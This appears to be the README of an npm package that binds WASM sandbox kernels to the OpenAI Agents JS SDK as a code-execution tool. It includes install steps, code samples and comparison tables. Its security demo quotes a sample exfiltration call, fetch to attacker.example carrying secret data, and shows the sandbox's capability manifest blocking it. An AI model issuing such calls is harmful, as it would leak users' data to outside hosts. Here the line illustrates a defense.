# /openai-agents

> Drop wasmagent sandbox kernels into the **OpenAI Agents JS SDK** as a
> native `tool`. Edge-safe code execution, one capability manifest, runs on
> Cloudflare Workers / Vercel Edge / Node — no E2B sandbox required.

[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/WasmAgent/wasmagent-js/tree/main/examples/openai-agents-quickjs?file=index.mjs)

## Why this exists

The 2026-04 OpenAI Agents JS release introduced a first-party
[`SandboxAgent`](https://openai.github.io/openai-agents-js/) with
Unix-local, Docker, and hosted-container execution clients. That covers
the case where a host process is available and you want OS-level
isolation. It does **not** cover:

- Cloudflare Workers / Vercel Edge / browser tabs (no host process for
  Unix-local; Docker isn't a thing on the edge).
- Air-gapped / offline deployments where reaching a hosted container is
  not allowed.
- Workloads where 50 ms is too long for cold start and per-second container
  billing dominates the cost.

The wasmagent kernels live below the OS line — QuickJS-in-WASM, Pyodide-in-WASM,
or Wasmtime — so they run wherever JS runs. This package binds them to the
Agents JS `Tool` shape.

## Before / After

Replacing the OpenAI built-in `code_interpreter` tool with a wasmagent WASM kernel:

```diff
 const agent = new Agent({
   name: "math-helper",
   tools: [
-    { type: "code_interpreter" },   // ← hosted, no edge support, per-session billing
+    sandboxedJsAgentTool({ kernel: new QuickJSKernel() }),
+    // ↑ in-process, edge-safe, $0/call, full CapabilityManifest
   ],
 });
```

Full before/after:

```diff
+import { sandboxedJsAgentTool } from "@wasmagent/openai-agents";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

 const agent = new Agent({
   name: "math-helper",
   tools: [
-    { type: "code_interpreter" },
+    sandboxedJsAgentTool({
+      kernel: new QuickJSKernel(),
+      capabilities: { allowedHosts: [] },
+    }),
   ],
 });
```

## Install

```bash
npm install @openai/agents /openai-agents /kernel-quickjs \
  quickjs-emscripten @jitl/quickjs-wasmfile-release-sync zod
```

## One-shot snippet evaluation

```ts
import { Agent } from "@openai/agents";
import { sandboxedJsAgentTool } from "/openai-agents";
import { QuickJSKernel } from "/kernel-quickjs";

const agent = new Agent({
  name: "math-helper",
  tools: [
    sandboxedJsAgentTool({
      kernel: new QuickJSKernel(),
      capabilities: { cpuMs: 5000 },
    }),
  ],
});
```

## Code-mode: collapse N tools

```ts
import { codeModeAgentTool } from "/openai-agents";
import { ToolRegistry } from "/core";

const tools = new ToolRegistry();
// …register downstream tools…

const portalTool = codeModeAgentTool({
  kernel: new QuickJSKernel(),
  tools,
  capabilities: { allowedHosts: ["api.example.com"] },
});

const agent = new Agent({ name: "ops", tools: [portalTool] });
// Model sees ONE tool; in-sandbox scripts call N tools via callTool(...).
```

## Kernel selection — pick the right tier

`sandboxedJsAgentTool()` and `codeModeAgentTool()` accept any wasmagent
kernel. The choice is independent of the SDK adapter — swap kernels in
one line, the rest of your code is unchanged:

| Kernel | When to pick it | Edge-safe |
| ------ | --------------- | --------- |
| `QuickJSKernel` (`/kernel-quickjs`) | Default. JS/TS workloads. ~2 MB cold start. | ✅ |
| `PyodideKernel` (`/kernel-pyodide`) | Model emits Python (numpy, pandas, regex-heavy). | ✅ (heavy) |
| `WasmtimeKernel` (`/kernel-wasmtime`) | Multi-language WASM modules / Javy-compiled JS for max isolation. | ✅ |
| `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |

Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same OpenAI Agents JS `Tool<T>` shape.

## Security demo

`CapabilityManifest` enforces network and filesystem policy at the kernel
boundary — the model cannot escape it regardless of what code it generates:

```ts
import { sandboxedJsAgentTool } from "@wasmagent/openai-agents";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const kernel = new QuickJSKernel();
const tool = sandboxedJsAgentTool({
  kernel,
  capabilities: {
    allowedHosts: [],           // no outbound network
    allowedPaths: [],           // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Model-generated code that tries to exfiltrate data:
// fetch("https://attacker.example/exfil?data=secret")
// → throws: network access denied — host "attacker.example" not in allowedHosts
```

The same manifest applies to both `sandboxedJsAgentTool` and `codeModeAgentTool`.

## Capability manifest

Same `CapabilityManifest` as the other adapters — see
[`docs/guides/code-mode.md`](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md#security-policy-face).

## When to pick this over `SandboxAgent`

| Need | OpenAI `SandboxAgent` | `/openai-agents` |
|---|---|---|
| Cloudflare Workers / Vercel Edge | ❌ requires host process | ✅ WASM kernel runs in-isolate |
| Native binaries / full POSIX | ✅ Docker / hosted | ❌ language-level only |
| Cold start | ~200–800 ms (container) | ~50 ms (WASM) |
| Cost per call | per-second container billing | $0 (in-process) |
| Offline / air-gapped | ❌ | ✅ |

Use both: `SandboxAgent` for "I need bash + git", `codeModeAgentTool` for
"the model wants to do math / parse JSON / chain tool calls".

## See also

- [`/aisdk`](https://www.npmjs.com/package//aisdk) — same kernels for Vercel AI SDK
- [`/claude-agent-sdk`](https://www.npmjs.com/package//claude-agent-sdk) — same kernels for Anthropic Claude Agent SDK
- [`/mastra-sandbox`](https://www.npmjs.com/package//mastra-sandbox) — same kernels as a Mastra sandbox provider
